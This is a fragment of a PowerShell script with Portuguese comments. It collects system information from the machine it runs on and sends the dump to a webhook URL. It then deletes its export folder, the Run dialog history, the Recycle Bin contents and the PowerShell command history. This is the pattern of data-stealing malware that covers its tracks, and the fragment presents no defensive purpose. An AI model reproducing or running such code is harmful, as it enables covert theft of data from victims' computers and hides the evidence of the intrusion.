    rp "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" * -ea $ea
    Clear-RecycleBin -fo -ea $ea
    rm (Get-PSReadLineOption).HistorySavePath -fo -ea $ea
    echo "Limpeza concluída!"
}

#### Executa ####
$dumpParams = @{
    DumpCommand = { Get-SystemInfo -OutputFile $OutputFileDefault -ExportDir $ExportDirDefault }
    OutputFile  = $OutputFileDefault
    ExportDir   = $ExportDirDefault
}
$out = Invoke-DataDump @dumpParams

#### Envia
$webhookParams = @{
    FilePath        = $out
    WebhookUrl      = $WebhookUrl
    Title           = "System Info"
    ExportDir       = $ExportDirDefault
    RemoveExportDir = $true
}
Send-DumpToWebhook @webhookParams

Clear-All


